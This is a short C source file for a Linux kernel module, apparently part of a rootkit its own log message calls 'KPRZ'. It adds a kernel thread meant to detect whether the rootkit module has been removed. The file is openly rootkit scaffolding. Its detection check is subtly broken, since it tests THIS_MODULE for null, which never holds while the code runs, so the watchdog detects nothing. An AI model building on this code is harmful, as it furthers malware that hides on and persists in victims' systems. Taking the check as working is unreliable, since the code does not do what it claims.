#include "self_watchdog.h"
#include <linux/module.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/sched/signal.h>
#include <linux/kallsyms.h>

static struct task_struct *self_watchdog_task;

static int watchdog_fn(void *data) {
    while (!kthread_should_stop()) {
        if (!THIS_MODULE) {
            printk(KERN_INFO "KPRZ: Rootkit module appears removed! Watchdog detected it.\n");
        }
        msleep(10000);
    }
    return 0;
}

void start_self_watchdog(void) {
    if (!self_watchdog_task)
        self_watchdog_task = kthread_run(watchdog_fn, NULL, "kprz_self_watchdog");
}

void stop_self_watchdog(void) {
    if (self_watchdog_task) {
        kthread_stop(self_watchdog_task);
        self_watchdog_task = NULL;
    }
}
